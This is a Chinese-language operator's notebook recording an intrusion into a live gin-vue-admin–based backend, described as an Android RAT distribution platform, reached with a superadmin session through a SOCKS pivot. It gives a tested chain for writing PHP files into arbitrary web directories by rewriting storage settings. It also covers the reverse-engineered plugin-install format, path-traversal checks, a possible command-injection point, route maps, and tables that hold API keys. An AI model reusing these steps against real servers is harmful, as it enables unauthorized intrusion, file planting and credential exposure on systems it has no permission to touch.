# GVA 二开:配置写落盘 + 插件安装格式(实测配方)

实测环境:GVA 二开(Android RAT 分发平台后端),超管会话,全部经 SOCKS 跳板。
所有接口前缀 `/api`。**凭据一律不带出。**

---

## 1. 配置写 → 任意目录文件写(实测走通)

### 接口对
```
POST /api/system/getSystemConfig    # 读全量配置(JSON),先快照落盘
POST /api/system/setSystemConfig    # 写配置,返回 {"code":0,"msg":"设置成功"}
```
**写即生效**,无需重启 —— 改完立刻再读会看到新值,且相关功能行为随新值改变。

### 四步链
```
① setSystemConfig: system.oss-type = "local"      # 从 aws-s3 切本地磁盘(关键开关)
② setSystemConfig: local.path      = <目标目录>    # 同时改 local.store-path
③ POST /api/fileUploadAndDownload/upload          # multipart,字段 file
④ 响应回传真实落盘绝对路径
```

实测落盘(两次不同目标目录,均确认写入):
```
/www/wwwroot/<site>/backend/releases/web/<md5>_<yyyyMMddHHmmss>.php
/www/wwwroot/default/<md5>_<yyyyMMddHHmmss>.php
```

### 文件名规则(重要限制)
`<md5>_<时间戳>.<原扩展名>` —— **扩展名可控,文件名不可控**。
要落成固定文件名(`authorized_keys`、`.user.ini` 等),必须另找重命名接口(`/fileUploadAndDownload/editFileName`)
或带 `fileName` 参数的接口,并验证其是否过滤路径穿越。

### 相关配置键(实测存在,可写)
```
system.oss-type          存储类型开关(local / aws-s3 / ...)
local.path               本地存储目录
local.store-path         本地存储目录(与上同值)
autocode.root / server / web     代码生成与插件安装的根路径
autocode.module          模块名
videoTranscode.ffmpegPath        可执行程序路径(见"未验证候选")
videoTranscode.workDir
mcp.path / mcp.addr      MCP 服务(实测 path 是 URL 路径前缀,不是可执行文件 —— 别误判)
zap.director             日志目录
```
**恢复纪律**:改完必须 `getSystemConfig` 再读一次**逐字段核对**。
`oss-type` 改错会让他们的上传从对象存储落到本地盘 —— 那是真破坏。

### 未验证候选(有理由但本轮没打通,别当结论)
- `videoTranscode.ffmpegPath` 若被**拼进 shell 字符串**调用则存在命令注入;若走 `os/exec` 则需真可执行文件。
  未验证。
- `autocode.root` 可写 → 理论上可修掉"插件安装源目录不存在"的部署缺陷,但**需要知道进程 CWD**才能对齐路径。

---

## 2. 插件安装(格式已逆向,但该部署环境缺陷导致不可用)

### 接口
```
POST /api/autoCode/installPlugin     # multipart,字段名 = plug(不是 file!)
POST /api/autoCode/pubPlug?plugName=<name>   # 打包,注意是 query 参数
GET  /api/autoCode/getPluginList
```
- `installPlugin` 不带 multipart → `request Content-Type isn't multipart/form-data`
- 带了但字段名错 → **Go 的 `http: no such file`**(= 字段名不匹配,换名字试)
- 字段名对了但格式不对 → `非标准插件，请按照文档自动迁移使用`

### 标准插件格式(读 GVA 开源源码得出)
源码 `server/service/system/auto_code_plugin.go`:
```go
paths, err := utils.Unzip(GVAPLUGPINATH+file.Filename, GVAPLUGPINATH)   // ← 解包在校验之前!
pathArr := strings.Split(paths[i], "/")
if pathArr[2]+"/"+pathArr[3] == "server/plugin" { serverPlugin = ... }
if pathArr[2]+"/"+pathArr[3] == "web/plugin"    { webPlugin = ... }
if 两者皆空 → "非标准插件，请按照文档自动迁移使用"
...
installation(webPlugin, AutoCode.Server, AutoCode.Web)   // 复制进 web 目录
```
常量:`GVAPLUGPINATH = "./gva-plug-temp/"`(相对**进程 CWD**)。

**推导**:解包后路径 = `filepath.Join("./gva-plug-temp/", 条目名)`,按 `/` 切分后
`pathArr[0]` 恒为 `gva-plug-temp` → **条目名必须是 `<一段前缀>/server/plugin/...` 或 `<一段前缀>/web/plugin/...`**。
`<一段前缀>` 就是插件名。

实测:按此格式打包后**校验通过**,报错前进到 `lstat`。

### 该部署上的死因(环境缺陷,不是手法问题)
```
lstat /www/wwwroot/<site>/backend/releases/server/gva-plug-temp/<plug>/server/plugin:
no such file or directory
```
`form = filepath.Join(Root, Server, pathArr[0..3])` 是**绝对路径**,
而解包发生在**进程 CWD 相对**的 `./gva-plug-temp/`。两者只有在 `CWD == <Root>/<Server>` 时才重合。
本部署不重合 → **合法插件也会装不上**(旁证:`getPluginList` 返回 null,他们从没用过这功能)。
重试一次排除 `defer os.RemoveAll` 竞态后仍恒定失败 → 收手。
**收益:报错暴露了完整绝对路径布局**(Root、Server、web 根、本地存储路径)。

### 路径穿越被堵
`utils.Unzip` 对含 `..` 的条目名**直接报错拒绝**(不是静默跳过)→ zip-slip 不可用。
Go 的 `filepath.Join` 会把绝对路径当相对段拼接,**前导 `/` 也逃不出去**。

---

## 3. `autoCode` 家族路由地图(从 `sys_apis` 脱出,1078 条里筛)

```
createTemp / preview / installPlugin / pubPlug    代码生成与插件
createPackage / getPackage / getTemplates / delPackage
mcp / mcpStart / mcpStop / mcpTest / mcpList / mcpStatus
saveAIWorkflowSession / getAIWorkflowSessionList / getAIWorkflowSessionDetail
deleteAIWorkflowSession / dumpAIWorkflowMarkdown
getDB / getTables / getColumn / getSysHistory / rollback / addFunc
```
- `dumpAIWorkflowMarkdown` / `saveAIWorkflowSession` 的绑定结构体分别是
  `SysAIWorkflowMarkdownDump` / `SysAIWorkflowSessionUpsert`(后者实测只有 `id:uint` + `title:string`)
- `getColumn?dbName=&tableName=` 是**读列结构最快的方式**,比走 SQL 注入省事得多

`/skills/*` 家族(同一 AI 子系统):
```
getTools → {"tools":["copilot","claude","cursor","trae","codex"]}
saveSkill   字段: tool + skill (+ meta / markdown,均实测持久化成功)
saveScript  字段: tool + skill + fileName + content
             ⚠️ 读回 shape 里也有 content —— 同一 fileName 连写多次时,
                没带 content 的调用会把之前的内容**覆盖成空**,必须单写单读
getSkillList / getSkillDetail / getScript / packageSkill / deleteSkill
⚠️ 每个查询器/注入动作都会在服务端留一个对象 —— 收尾按命名前缀批量清
```

### AI 子系统三张表(判断能否执行的关键)
```
gva_ai_provider_configs : name, provider, base_url, api_key, model, max_tokens, timeout_sec
gva_ai_prompt_templates : name, task_type, system_prompt, user_prompt, output_schema, enabled
gva_ai_analysis_tasks   : device_id, agent_id, employee_id, task_type, status, provider_id,
                          input_summary, result, raw_response, tokens_used, duration_ms
```
实测 provider = `openrouter` + `deepseek-*` → **云 API,不执行产物,AI 面到此为止**。

---

## 4. 验收标准(本轮教训)

拿到"文件写进任意目录"时**不要**对外表述为 shell。
本轮真实状态:文件确实落盘(响应回真实绝对路径),但**任一 vhost 都没把它当 PHP 执行** ——
取回全是 SPA 的 `index.html`,因为前端资源 `go:embed` 进了二进制。

**判据:任意不存在的路径也返回同一个 SPA = 静态资源是嵌入的,往那个目录写文件没有执行价值。**
**真正的验收是取回被执行的输出,不是落盘路径。**
